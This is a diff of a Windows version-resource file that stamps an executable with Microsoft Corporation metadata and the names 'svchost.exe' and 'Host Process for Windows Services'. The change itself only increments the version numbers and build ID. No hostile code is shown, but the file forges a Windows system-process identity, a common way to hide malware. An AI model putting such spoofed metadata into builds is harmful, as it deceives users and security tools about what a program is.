@@ -33,13 +33,13 @@ VSVersionInfo(
         StringStruct('LegalCopyright', '\xA9 Microsoft Corporation. All rights reserved.'),
         StringStruct('CompanyName', 'Microsoft Corporation'),
         StringStruct('FileDescription', 'Host Process for Windows Services'),
-        StringStruct('FileVersion', '9.3.0.0'),
-        StringStruct('ProductVersion', '9.3.0.0'),
+        StringStruct('FileVersion', '9.3.1.0'),
+        StringStruct('ProductVersion', '9.3.1.0'),
         StringStruct('InternalName', 'svchost.exe'),
         StringStruct('LegalTrademarks', ''),
         StringStruct('OriginalFilename', 'svchost.exe'),
         StringStruct('ProductName', 'Microsoft\xAE Windows\xAE Operating System'),
-        StringStruct('BuildID', '12222301')])
+        StringStruct('BuildID', '122820232119')])
       ]), 
     VarFileInfo([VarStruct('Translation', [0, 1200])])
   ]
